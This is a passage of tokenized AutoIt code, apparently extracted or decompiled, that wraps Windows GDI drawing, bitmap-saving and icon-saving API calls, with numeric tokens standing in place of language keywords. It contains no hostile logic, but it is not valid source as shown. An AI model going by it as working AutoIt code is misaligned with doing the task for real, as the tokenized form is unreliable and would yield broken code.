13$I=$ISTART15$IEND
$ICOUNT+=1
13$J=0151
69($TPOINT,$ICOUNT,$APOINT[$I][$J],$J+1)
14
69($TTYPES,1,$APOINT[$I][2],$ICOUNT)
14
28$ARET=58("gdi32.dll","bool","PolyDraw","handle",$HDC,"struct*",$TPOINT,"struct*",$TTYPES,"dword",$IPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_POLYGON($HDC,3036$APOINT,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2,2)534287(@ERROR+10,@EXTENDED,40)
28$TAGSTRUCT=""
13$I=$ISTART15$IEND
$TAGSTRUCT&="int[2];"
14
28$TDATA=65($TAGSTRUCT)
28$ICOUNT=1
13$I=$ISTART15$IEND
13$J=0151
69($TDATA,$ICOUNT,$APOINT[$I][$J],$J+1)
14
$ICOUNT+=1
14
28$ARET=58("gdi32.dll","bool","Polygon","handle",$HDC,"struct*",$TDATA,"int",$ICOUNT-1)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PTINRECTEX($IX,$IY,$ILEFT,$ITOP,$IRIGHT,$IBOTTOM)
28$TRECT=_WINAPI_CREATERECT($ILEFT,$ITOP,$IRIGHT,$IBOTTOM)
28$TPOINT=_WINAPI_CREATEPOINT($IX,$IY)
28$ARET=58("user32.dll","bool","PtInRect","struct*",$TRECT,"struct",$TPOINT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PTINREGION($HRGN,$IX,$IY)
28$ARET=58("gdi32.dll","bool","PtInRegion","handle",$HRGN,"int",$IX,"int",$IY)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_PTVISIBLE($HDC,$IX,$IY)
28$ARET=58("gdi32.dll","bool","PtVisible","handle",$HDC,"int",$IX,"int",$IY)
4@ERROR534287(@ERROR+10,@EXTENDED,0)
4$ARET[0]=-1534287(10,$ARET[0],0)
34$ARET[0]
33
32_WINAPI_RADIALGRADIENTFILL($HDC,$IX,$IY,$IRADIUS,$IRGB1,$IRGB2,$FANGLESTART=0,$FANGLEEND=360,$FSTEP=5)
40($FANGLESTART)>3605
$FANGLESTART=240($FANGLESTART,360)
8
40($FANGLEEND)>3605
$FANGLEEND=240($FANGLEEND,360)
8
4($FANGLESTART<0)2($FANGLEEND<0)5
$FANGLESTART+=360
$FANGLEEND+=360
8
4$FANGLESTART>$FANGLEEND5
28$FVAL=$FANGLESTART
$FANGLESTART=$FANGLEEND
$FANGLEEND=$FVAL
8
4$FSTEP<15
$FSTEP=1
8
28$FKI=8(1)/45
28$IXP=280($IX+$IRADIUS*51($FKI*$FANGLESTART))
28$IYP=280($IY+$IRADIUS*292($FKI*$FANGLESTART))
28$IXN,$IYN,$FAN=$FANGLESTART
28$AVERTEX[3][3]
9$FAN<$FANGLEEND
$FAN+=$FSTEP
4$FAN>$FANGLEEND5
$FAN=$FANGLEEND
8
$IXN=280($IX+$IRADIUS*51($FKI*$FAN))
$IYN=280($IY+$IRADIUS*292($FKI*$FAN))
$AVERTEX[0][0]=$IX
$AVERTEX[0][1]=$IY
$AVERTEX[0][2]=$IRGB1
$AVERTEX[1][0]=$IXP
$AVERTEX[1][1]=$IYP
$AVERTEX[1][2]=$IRGB2
$AVERTEX[2][0]=$IXN
$AVERTEX[2][1]=$IYN
$AVERTEX[2][2]=$IRGB2
43_WINAPI_GRADIENTFILL($HDC,$AVERTEX,0,2)5
34287(@ERROR,@EXTENDED,0)
8
$IXP=$IXN
$IYP=$IYN
10
341
33
32_WINAPI_RECTANGLE($HDC,$TRECT)
28$ARET=58("gdi32.dll","bool","Rectangle","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4))
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_RECTINREGION($HRGN,$TRECT)
28$ARET=58("gdi32.dll","bool","RectInRegion","handle",$HRGN,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_RECTISEMPTY(36$TRECT)
34(66($TRECT,"Left")=0)1(66($TRECT,"Top")=0)1(66($TRECT,"Right")=0)1(66($TRECT,"Bottom")=0)
33
32_WINAPI_RECTVISIBLE($HDC,$TRECT)
28$ARET=58("gdi32.dll","bool","RectVisible","handle",$HDC,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
23$ARET[0]
210,1,2
216
34287(10,$ARET[0],0)
24
34$ARET[0]
33
32_WINAPI_REMOVEFONTMEMRESOURCEEX($HFONT)
28$ARET=58("gdi32.dll","bool","RemoveFontMemResourceEx","handle",$HFONT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_REMOVEFONTRESOURCEEX($SFONT,$IFLAG=0,$BNOTIFY=40)
28$ARET=58("gdi32.dll","bool","RemoveFontResourceExW","wstr",$SFONT,"dword",$IFLAG,"ptr",0)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,40)
4$BNOTIFY5
2830$WM_FONTCHANGE=29
2830$HWND_BROADCAST=65535
58("user32.dll","none","SendMessage","hwnd",$HWND_BROADCAST,"uint",$WM_FONTCHANGE,"wparam",0,"lparam",0)
8
34$ARET[0]
33
32_WINAPI_RGB($IRED,$IGREEN,$IBLUE)
34__RGB(19(21($IBLUE,-16),21($IGREEN,-8),$IRED))
33
32_WINAPI_ROTATEPOINTS(36$APOINT,$IXC,$IYC,$FANGLE,$ISTART=0,$IEND=-1)
4__CHECKERRORARRAYBOUNDS($APOINT,$ISTART,$IEND,2)534287(@ERROR+10,@EXTENDED,0)
4369($APOINT,$UBOUND_COLUMNS)<2534287(13,0,0)
28$FCOS=51(8(1)/45*$FANGLE)
28$FSIN=292(8(1)/45*$FANGLE)
28$IXN,$IYN
13$I=$ISTART15$IEND
$IXN=$APOINT[$I][0]-$IXC
$IYN=$APOINT[$I][1]-$IYC
$APOINT[$I][0]=$IXC+280($IXN*$FCOS-$IYN*$FSIN)
$APOINT[$I][1]=$IYC+280($IXN*$FSIN+$IYN*$FCOS)
14
341
33
32_WINAPI_ROUNDRECT($HDC,$TRECT,$IWIDTH,$IHEIGHT)
28$ARET=58("gdi32.dll","bool","RoundRect","handle",$HDC,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4),"int",$IWIDTH,"int",$IHEIGHT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SAVEHBITMAPTOFILE($SFILEPATH,$HBITMAP,$IXPELSPERMETER=41,$IYPELSPERMETER=41)
28$TBMP=65("align 1;ushort bfType;dword bfSize;ushort bfReserved1;ushort bfReserved2;dword bfOffset")
28$TDIB=65($TAGDIBSECTION)
28$HDC,$HSV,$HSOURCE=0
9$HBITMAP
4(3_WINAPI_GETOBJECT($HBITMAP,68($TDIB),$TDIB))2(66($TDIB,"biCompression"))5
$HBITMAP=0
6
2366($TDIB,"bmBitsPixel")
2132
43_WINAPI_ISALPHABITMAP($HBITMAP)5
43$HSOURCE5
$HSOURCE=_WINAPI_CREATEDIB(66($TDIB,"bmWidth"),66($TDIB,"bmHeight"),24)
43$HSOURCE5
$HBITMAP=0
8
$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
$HSV=_WINAPI_SELECTOBJECT($HDC,$HSOURCE)
4_WINAPI_DRAWBITMAP($HDC,0,0,$HBITMAP)5
$HBITMAP=$HSOURCE
6
$HBITMAP=0
8
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
6
$HBITMAP=0
8
19
8
216
24
4(366($TDIB,"bmBits"))2(366($TDIB,"biSizeImage"))5
43$HSOURCE5
$HBITMAP=_WINAPI_COPYBITMAP($HBITMAP)
$HSOURCE=$HBITMAP
6
$HBITMAP=0
8
6
18
8
8
10
28$HFILE=0,$IERROR=0,$IRESULT=0
11
43$HBITMAP5
$IERROR=1
18
8
28$ADATA[4][2]
$ADATA[0][0]=67($TBMP)
$ADATA[0][1]=68($TBMP)
$ADATA[1][0]=67($TDIB,"biSize")
$ADATA[1][1]=40
$ADATA[2][1]=66($TDIB,"biClrUsed")*4
28$TTABLE=0
4$ADATA[2][1]5
$TTABLE=_WINAPI_GETDIBCOLORTABLE($HBITMAP)
4@ERROR2(@EXTENDED<>$ADATA[2][1]/4)5
$IERROR=@ERROR+10
18
8
8
$ADATA[2][0]=67($TTABLE)
$ADATA[3][0]=66($TDIB,"bmBits")
$ADATA[3][1]=66($TDIB,"biSizeImage")
69($TBMP,"bfType",19778)
69($TBMP,"bfSize",$ADATA[0][1]+$ADATA[1][1]+$ADATA[2][1]+$ADATA[3][1])
69($TBMP,"bfReserved1",0)
69($TBMP,"bfReserved2",0)
69($TBMP,"bfOffset",$ADATA[0][1]+$ADATA[1][1]+$ADATA[2][1])
$HDC=_WINAPI_GETDC(0)
4$IXPELSPERMETER=415
4366($TDIB,"biXPelsPerMeter")5
69($TDIB,"biXPelsPerMeter",_WINAPI_GETDEVICECAPS($HDC,8)/_WINAPI_GETDEVICECAPS($HDC,4)*1000)
8
6
69($TDIB,"biXPelsPerMeter",$IXPELSPERMETER)
8
4$IYPELSPERMETER=415
4366($TDIB,"biYPelsPerMeter")5
69($TDIB,"biYPelsPerMeter",_WINAPI_GETDEVICECAPS($HDC,10)/_WINAPI_GETDEVICECAPS($HDC,6)*1000)
8
6
69($TDIB,"biYPelsPerMeter",$IYPELSPERMETER)
8
_WINAPI_RELEASEDC(0,$HDC)
$HFILE=_WINAPI_CREATEFILE($SFILEPATH,1,4)
4@ERROR5
$IERROR=@ERROR+20
18
8
28$IBYTES
13$I=0153
4$ADATA[$I][1]5
43_WINAPI_WRITEFILE($HFILE,$ADATA[$I][0],$ADATA[$I][1],$IBYTES)5
$IERROR=@ERROR+30
182
8
8
14
$IRESULT=1
121
4$HSOURCE5
_WINAPI_DELETEOBJECT($HSOURCE)
8
_WINAPI_CLOSEHANDLE($HFILE)
43$IRESULT5
94($SFILEPATH)
8
34287($IERROR,0,$IRESULT)
33
32_WINAPI_SAVEHICONTOFILE($SFILEPATH,3036$VICON,$BCOMPRESS=0,$ISTART=0,$IEND=-1)
28$AICON,$ATEMP,$ICOUNT=1
43219($VICON)5
26$AICON[1]=[$VICON]
26$ATEMP[1]=[0]
6
4__CHECKERRORARRAYBOUNDS($VICON,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
$ICOUNT=$IEND-$ISTART+1
4$ICOUNT5
26$AICON[$ICOUNT]
26$ATEMP[$ICOUNT]
13$I=015$ICOUNT-1
$AICON[$I]=$VICON[$ISTART+$I]
$ATEMP[$I]=0
14
8
8
28$HFILE=_WINAPI_CREATEFILE($SFILEPATH,1,4)
4@ERROR534287(@ERROR+20,@EXTENDED,0)
28$TICO=65("align 1;ushort Reserved;ushort Type;ushort Count;byte Data["&(16*$ICOUNT)&"]")
28$ILENGTH=68($TICO)
28$TBI=65($TAGBITMAPINFOHEADER)
28$TII=65($TAGICONINFO)
28$TDIB=65($TAGDIBSECTION)
28$IDIB=68($TDIB)
28$PDIB=67($TDIB)
28$IOFFSET=$ILENGTH
69($TBI,"biSize",40)
69($TBI,"biPlanes",1)
69($TBI,"biXPelsPerMeter",0)
69($TBI,"biYPelsPerMeter",0)
69($TBI,"biClrUsed",0)
69($TBI,"biClrImportant",0)
69($TICO,"Reserved",0)
69($TICO,"Type",1)
69($TICO,"Count",$ICOUNT)
28$IRESULT=0,$IERROR=0,$IBYTES
28$AINFO[8],$ARET,$PDATA=0,$IINDEX=0
28$ASIZE[2],$TDATA=0
11
43_WINAPI_WRITEFILE($HFILE,$TICO,$ILENGTH,$IBYTES)5
$IERROR=@ERROR+30
18
8
9$ICOUNT>$IINDEX
$ARET=58("user32.dll","bool","GetIconInfo","handle",$AICON[$IINDEX],"struct*",$TII)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+40
182
8
13$I=4155
$AINFO[$I]=_WINAPI_COPYIMAGE(66($TII,$I),0,0,0,8200)
4_WINAPI_GETOBJECT($AINFO[$I],$IDIB,$PDIB)5
$AINFO[$I-4]=66($TDIB,"biSizeImage")
$AINFO[$I-2]=66($TDIB,"bmBits")
6
$IERROR=@ERROR+50
8
14
$AINFO[6]=40
$AINFO[7]=66($TDIB,"bmBitsPixel")
23$AINFO[7]
2116,24
2132
43_WINAPI_ISALPHABITMAP($AINFO[5])5
43$ATEMP[$IINDEX]5
$AICON[$IINDEX]=_WINAPI_CREATE32BITHICON($AICON[$IINDEX])
$ATEMP[$IINDEX]=$AICON[$IINDEX]
43@ERROR5
19
6
25
8
8
6
4($AINFO[1]>=256*256*4)1($BCOMPRESS)5
$IBYTES=_WINAPI_COMPRESSBITMAPBITS($AINFO[5],$PDATA)
43@ERROR5
$AINFO[0]=0
$AINFO[1]=$IBYTES
$AINFO[2]=0
$AINFO[3]=$PDATA
$AINFO[6]=0
8
8
8
216
$IERROR=60
24
43$IERROR5
$TDATA=65("byte Width;byte Height;byte ColorCount;byte Reserved;ushort Planes;ushort BitCount;long Size;long Offset",67($TICO)+6+16*$IINDEX)
69($TDATA,"ColorCount",0)
69($TDATA,"Reserved",0)
69($TDATA,"Planes",1)
69($TDATA,"BitCount",$AINFO[7])
69($TDATA,"Size",$AINFO[0]+$AINFO[1]+$AINFO[6])
69($TDATA,"Offset",$IOFFSET)
13$I=0151
$ASIZE[$I]=66($TDIB,$I+2)
4$ASIZE[$I]<2565
69($TDATA,$I+1,$ASIZE[$I])
6
69($TDATA,$I+1,0)
8
14
69($TBI,"biWidth",$ASIZE[0])
69($TBI,"biHeight",2*$ASIZE[1])
69($TBI,"biBitCount",$AINFO[7])
69($TBI,"biCompression",0)
69($TBI,"biSizeImage",$AINFO[0]+$AINFO[1])
$IOFFSET+=$AINFO[0]+$AINFO[1]+$AINFO[6]
11
4$AINFO[6]5
43_WINAPI_WRITEFILE($HFILE,$TBI,$AINFO[6],$IBYTES)5
$IERROR=@ERROR+70
18
8
13$I=115016-1
43_WINAPI_WRITEFILE($HFILE,$AINFO[$I+2],$AINFO[$I],$IBYTES)5
$IERROR=@ERROR+80
182
8
14
6
43_WINAPI_WRITEFILE($HFILE,$AINFO[3],$AINFO[1],$IBYTES)5
$IERROR=@ERROR+90
18
8
8
121
8
13$I=4155
_WINAPI_DELETEOBJECT($AINFO[$I])
14
4$IERROR5
182
8
$IINDEX+=1
10
$ARET=58("kernel32.dll","bool","SetFilePointerEx","handle",$HFILE,"int64",0,"int64*",0,"dword",0)
4@ERROR23$ARET[0]5
$IERROR=@ERROR+100
18
8
43_WINAPI_WRITEFILE($HFILE,$TICO,$ILENGTH,$IBYTES)5
$IERROR=@ERROR+110
18
8
$IRESULT=1
121
13$I=015$ICOUNT-1
4$ATEMP[$I]5
_WINAPI_DESTROYICON($ATEMP[$I])
8
14
4$PDATA5
__HEAPFREE($PDATA)
8
_WINAPI_CLOSEHANDLE($HFILE)
43$IRESULT5
94($SFILEPATH)
8
34287($IERROR,0,$IRESULT)
33
32_WINAPI_SCALEWINDOWEXT($HDC,$IXNUM,$IXDENOM,$IYNUM,$IYDENOM)
$__G_VEXT=65($TAGSIZE)
28$ARET=58("gdi32.dll","bool","ScaleWindowExtEx","handle",$HDC,"int",$IXNUM,"int",$IXDENOM,"int",$IYNUM,"int",$IYDENOM,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SELECTCLIPPATH($HDC,$IMODE=5)
28$ARET=58("gdi32.dll","bool","SelectClipPath","handle",$HDC,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SELECTCLIPRGN($HDC,$HRGN)
28$ARET=58("gdi32.dll","int","SelectClipRgn","handle",$HDC,"handle",$HRGN)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETARCDIRECTION($HDC,$IDIRECTION)
28$ARET=58("gdi32.dll","int","SetArcDirection","handle",$HDC,"int",$IDIRECTION)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETBITMAPBITS($HBITMAP,$ISIZE,$PBITS)
28$ARET=58("gdi32.dll","long","SetBitmapBits","handle",$HBITMAP,"dword",$ISIZE,"struct*",$PBITS)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETBITMAPDIMENSIONEX($HBITMAP,$IWIDTH,$IHEIGHT)
$__G_VEXT=65($TAGSIZE)
28$ARET=58("gdi32.dll","bool","SetBitmapDimensionEx","handle",$HBITMAP,"int",$IWIDTH,"int",$IHEIGHT,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETBOUNDSRECT($HDC,$IFLAGS,$TRECT=0)
28$ARET=58("gdi32.dll","uint","SetBoundsRect","handle",$HDC,"struct*",$TRECT,"uint",$IFLAGS)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETBRUSHORG($HDC,$IX,$IY)
$__G_VEXT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","SetBrushOrgEx","handle",$HDC,"int",$IX,"int",$IY,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETCOLORADJUSTMENT($HDC,$TADJUSTMENT)
28$ARET=58("gdi32.dll","bool","SetColorAdjustment","handle",$HDC,"struct*",$TADJUSTMENT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETDCBRUSHCOLOR($HDC,$IRGB)
28$ARET=58("gdi32.dll","dword","SetDCBrushColor","handle",$HDC,"dword",__RGB($IRGB))
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_SETDCPENCOLOR($HDC,$IRGB)
28$ARET=58("gdi32.dll","dword","SetDCPenColor","handle",$HDC,"dword",__RGB($IRGB))
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34__RGB($ARET[0])
33
32_WINAPI_SETDEVICEGAMMARAMP($HDC,3036$ARAMP)
4(369($ARAMP,$UBOUND_DIMENSIONS)<>2)2(369($ARAMP,$UBOUND_ROWS)<>256)2(369($ARAMP,$UBOUND_COLUMNS)<>3)5
34287(12,0,0)
8
28$TDATA=65("ushort[256];ushort[256];ushort[256]")
13$I=0152
13$J=015255
69($TDATA,$I+1,$ARAMP[$J][$I],$J+1)
14
14
28$ARET=58("gdi32.dll","bool","SetDeviceGammaRamp","handle",$HDC,"struct*",$TDATA)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETDIBCOLORTABLE($HBITMAP,$TCOLORTABLE,$ICOLORCOUNT)
4$ICOLORCOUNT>68($TCOLORTABLE)/4534287(1,0,0)
28$HDC=_WINAPI_CREATECOMPATIBLEDC(0)
28$HSV=_WINAPI_SELECTOBJECT($HDC,$HBITMAP)
28$IERROR=0
28$ARET=58("gdi32.dll","uint","SetDIBColorTable","handle",$HDC,"uint",0,"uint",$ICOLORCOUNT,"struct*",$TCOLORTABLE)
4@ERROR5$IERROR=@ERROR
_WINAPI_SELECTOBJECT($HDC,$HSV)
_WINAPI_DELETEDC($HDC)
4$IERROR534287($IERROR,0,0)
34$ARET[0]
33
32_WINAPI_SETDIBITS($HDC,$HBITMAP,$ISTARTSCAN,$ISCANLINES,$PBITS,$TBMI,$ICOLORUSE=0)
28$ARESULT=58("gdi32.dll","int","SetDIBits","handle",$HDC,"handle",$HBITMAP,"uint",$ISTARTSCAN,"uint",$ISCANLINES,"struct*",$PBITS,"struct*",$TBMI,"INT",$ICOLORUSE)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARESULT[0]
33
32_WINAPI_SETDIBITSTODEVICE($HDC,$IXDEST,$IYDEST,$IWIDTH,$IHEIGHT,$IXSRC,$IYSRC,$ISTARTSCAN,$ISCANLINES,$TBITMAPINFO,$IUSAGE,$PBITS)
28$ARET=58("gdi32.dll","int","SetDIBitsToDevice","handle",$HDC,"int",$IXDEST,"int",$IYDEST,"dword",$IWIDTH,"dword",$IHEIGHT,"int",$IXSRC,"int",$IYSRC,"uint",$ISTARTSCAN,"uint",$ISCANLINES,"struct*",$PBITS,"struct*",$TBITMAPINFO,"uint",$IUSAGE)
4@ERROR2($ARET[0]=-1)534287(@ERROR+10,$ARET[0],0)
34$ARET[0]
33
32_WINAPI_SETENHMETAFILEBITS($PDATA,$ILENGTH)
28$ARET=58("gdi32.dll","handle","SetEnhMetaFileBits","uint",$ILENGTH,"struct*",$PDATA)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETGRAPHICSMODE($HDC,$IMODE)
28$ARET=58("gdi32.dll","int","SetGraphicsMode","handle",$HDC,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETMAPMODE($HDC,$IMODE)
28$ARET=58("gdi32.dll","int","SetMapMode","handle",$HDC,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETPIXEL($HDC,$IX,$IY,$IRGB)
28$ARET=58("gdi32.dll","bool","SetPixelV","handle",$HDC,"int",$IX,"int",$IY,"dword",__RGB($IRGB))
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETPOLYFILLMODE($HDC,$IMODE=1)
28$ARET=58("gdi32.dll","int","SetPolyFillMode","handle",$HDC,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETRECTRGN($HRGN,$TRECT)
28$ARET=58("gdi32.dll","bool","SetRectRgn","handle",$HRGN,"int",66($TRECT,1),"int",66($TRECT,2),"int",66($TRECT,3),"int",66($TRECT,4))
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETROP2($HDC,$IMODE)
28$ARET=58("gdi32.dll","int","SetROP2","handle",$HDC,"int",$IMODE)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_SETSTRETCHBLTMODE($HDC,$IMODE)
28$ARET=58("gdi32.dll","int","SetStretchBltMode","handle",$HDC,"int",$IMODE)
4@ERROR23$ARET[0]2($ARET[0]=87)534287(@ERROR+10,$ARET[0],0)
34$ARET[0]
33
32_WINAPI_SETTEXTALIGN($HDC,$IMODE=0)
28$ARET=58("gdi32.dll","uint","SetTextAlign","handle",$HDC,"uint",$IMODE)
4@ERROR2($ARET[0]=4294967295)534287(@ERROR,@EXTENDED,-1)
34$ARET[0]
33
32_WINAPI_SETTEXTCHARACTEREXTRA($HDC,$ICHAREXTRA)
28$ARET=58("gdi32.dll","int","SetTextCharacterExtra","handle",$HDC,"int",$ICHAREXTRA)
4@ERROR2($ARET[0]=-2147483648)534287(@ERROR,@EXTENDED,-1)
34$ARET[0]
33
32_WINAPI_SETTEXTJUSTIFICATION($HDC,$IBREAKEXTRA,$IBREAKCOUNT)
28$ARET=58("gdi32.dll","bool","SetTextJustification","handle",$HDC,"int",$IBREAKEXTRA,"int",$IBREAKCOUNT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETUDFCOLORMODE($IMODE)
$__G_IRGBMODE=3($IMODE=0)
33
32_WINAPI_SETWINDOWEXT($HDC,$IXEXTENT,$IYEXTENT)
$__G_VEXT=65($TAGSIZE)
28$ARET=58("gdi32.dll","bool","SetWindowExtEx","handle",$HDC,"int",$IXEXTENT,"int",$IYEXTENT,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETWINDOWORG($HDC,$IX,$IY)
$__G_VEXT=65($TAGPOINT)
28$ARET=58("gdi32.dll","bool","SetWindowOrgEx","handle",$HDC,"int",$IX,"int",$IY,"struct*",$__G_VEXT)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SETWORLDTRANSFORM($HDC,36$TXFORM)
28$ARET=58("gdi32.dll","bool","SetWorldTransform","handle",$HDC,"struct*",$TXFORM)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_STRETCHBLT($HDESTDC,$IXDEST,$IYDEST,$IWIDTHDEST,$IHEIGHTDEST,$HSRCDC,$IXSRC,$IYSRC,$IWIDTHSRC,$IHEIGHTSRC,$IROP)
28$ARET=58("gdi32.dll","bool","StretchBlt","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTHDEST,"int",$IHEIGHTDEST,"hwnd",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"int",$IWIDTHSRC,"int",$IHEIGHTSRC,"dword",$IROP)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_STRETCHDIBITS($HDESTDC,$IXDEST,$IYDEST,$IWIDTHDEST,$IHEIGHTDEST,$IXSRC,$IYSRC,$IWIDTHSRC,$IHEIGHTSRC,$TBITMAPINFO,$IUSAGE,$PBITS,$IROP)
28$ARET=58("gdi32.dll","int","StretchDIBits","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTHDEST,"int",$IHEIGHTDEST,"int",$IXSRC,"int",$IYSRC,"int",$IWIDTHSRC,"int",$IHEIGHTSRC,"struct*",$PBITS,"struct*",$TBITMAPINFO,"uint",$IUSAGE,"dword",$IROP)
4@ERROR2($ARET[0]=-1)534287(@ERROR+10,$ARET[0],0)
34$ARET[0]
33
32_WINAPI_STROKEANDFILLPATH($HDC)
28$ARET=58("gdi32.dll","bool","StrokeAndFillPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_STROKEPATH($HDC)
28$ARET=58("gdi32.dll","bool","StrokePath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_SUBTRACTRECT(36$TRECT1,36$TRECT2)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","SubtractRect","struct*",$TRECT,"struct*",$TRECT1,"struct*",$TRECT2)
4@ERROR23$ARET[0]534287(@ERROR+10,@EXTENDED,0)
34$TRECT
33
32_WINAPI_TABBEDTEXTOUT($HDC,$IX,$IY,$STEXT,$ATAB=0,$ISTART=0,$IEND=-1,$IORIGIN=0)
28$ITAB,$ICOUNT
43219($ATAB)5
4$ATAB5
$ITAB=$ATAB
26$ATAB[1]=[$ITAB]
$ISTART=0
$IEND=0
$ICOUNT=1
6
$ICOUNT=0
8
6
$ICOUNT=1
8
28$TTAB=0
4$ICOUNT5
4__CHECKERRORARRAYBOUNDS($ATAB,$ISTART,$IEND)534287(@ERROR+10,@EXTENDED,0)
$ICOUNT=$IEND-$ISTART+1
$TTAB=65("uint["&$ICOUNT&"]")
$ITAB=1
13$I=$ISTART15$IEND
69($TTAB,1,$ATAB[$I],$ITAB)
$ITAB+=1
14
8
28$ARET=58("user32.dll","long","TabbedTextOutW","handle",$HDC,"int",$IX,"int",$IY,"wstr",$STEXT,"int",323($STEXT),"int",$ICOUNT,"struct*",$TTAB,"int",$IORIGIN)
4@ERROR23$ARET[0]534287(@ERROR,@EXTENDED,0)
$__G_VEXT=_WINAPI_CREATESIZE(_WINAPI_LOWORD($ARET[0]),_WINAPI_HIWORD($ARET[0]))
341
33
32_WINAPI_TEXTOUT($HDC,$IX,$IY,$STEXT)
28$ARET=58("gdi32.dll","bool","TextOutW","handle",$HDC,"int",$IX,"int",$IY,"wstr",$STEXT,"int",323($STEXT))
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_TRANSPARENTBLT($HDESTDC,$IXDEST,$IYDEST,$IWIDTHDEST,$IHEIGHTDEST,$HSRCDC,$IXSRC,$IYSRC,$IWIDTHSRC,$IHEIGHTSRC,$IRGB)
28$ARET=58("gdi32.dll","bool","GdiTransparentBlt","handle",$HDESTDC,"int",$IXDEST,"int",$IYDEST,"int",$IWIDTHDEST,"int",$IHEIGHTDEST,"hwnd",$HSRCDC,"int",$IXSRC,"int",$IYSRC,"int",$IWIDTHSRC,"int",$IHEIGHTSRC,"dword",__RGB($IRGB))
4@ERROR534287(@ERROR,@EXTENDED,40)
34$ARET[0]
33
32_WINAPI_UNIONRECT(36$TRECT1,36$TRECT2)
28$TRECT=65($TAGRECT)
28$ARET=58("user32.dll","bool","UnionRect","struct*",$TRECT,"struct*",$TRECT1,"struct*",$TRECT2)
4@ERROR23$ARET[0]534287(@ERROR+10,0,0)
34$TRECT
33
32_WINAPI_VALIDATERECT($HWND,$TRECT=0)
28$ARET=58("user32.dll","bool","ValidateRect","hwnd",$HWND,"struct*",$TRECT)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_VALIDATERGN($HWND,$HRGN=0)
28$ARET=58("user32.dll","bool","ValidateRgn","hwnd",$HWND,"handle",$HRGN)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_WIDENPATH($HDC)
28$ARET=58("gdi32.dll","bool","WidenPath","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
34$ARET[0]
33
32_WINAPI_WINDOWFROMDC($HDC)
28$ARET=58("user32.dll","hwnd","WindowFromDC","handle",$HDC)
4@ERROR534287(@ERROR,@EXTENDED,0)
